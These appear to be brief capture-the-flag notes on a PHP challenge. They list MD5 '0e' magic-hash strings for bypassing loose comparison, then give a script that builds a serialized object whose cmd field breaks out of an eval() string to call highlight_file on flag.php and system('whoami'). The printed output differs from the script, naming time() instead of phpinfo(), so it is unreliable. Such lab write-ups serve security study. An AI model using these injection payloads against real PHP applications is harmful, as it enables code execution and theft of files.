![[Pasted image 20231205203923.png]]
s214587387a
QNKCDZO
0e215962017


![[Pasted image 20231205214243.png]]
```php

 <?php
// 照抄一份flag类的定义
class flag
{
    public $cmd='index.php';

    public function __destruct(){
        if (preg_match('/\w+\((?R)?\)/', $this->cmd)){
            eval('$a="'.$this->cmd.'";');
        }
        else {
            die('hack!!!');
        }
    }
}
$class = new flag();
$class->cmd = '1";phpinfo();highlight_file("flag.php");system("whoami");"';
$class_ser = serialize($class);
print_r($class_ser);

```
输出：O:4:"flag":1:{s:3:"cmd";s:55:"1";time();highlight_file("flag.php");system("whoami");"";}


